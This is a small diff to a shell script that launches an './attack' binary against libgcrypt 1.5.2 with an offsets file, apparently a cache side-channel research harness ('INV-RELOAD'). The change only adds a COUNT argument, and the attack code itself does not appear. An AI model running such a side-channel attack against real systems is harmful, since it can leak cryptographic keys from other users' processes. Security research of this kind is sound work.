@@ -7,8 +7,9 @@ make
 LIBGCRYPT=/usr/local/lib/libgcrypt.so.11.8.1
 OFFSET=${HOME}/INV-RELOAD/offsets/offset-libgcrypt-1.5.2.txt
 CYCLE=$1
+COUNT=$2
 
-./attack ${LIBGCRYPT} ${OFFSET} ${CYCLE} &
+./attack ${LIBGCRYPT} ${OFFSET} ${CYCLE} ${COUNT} &
 ATTACK_PID=$!
 
 sleep 0.001
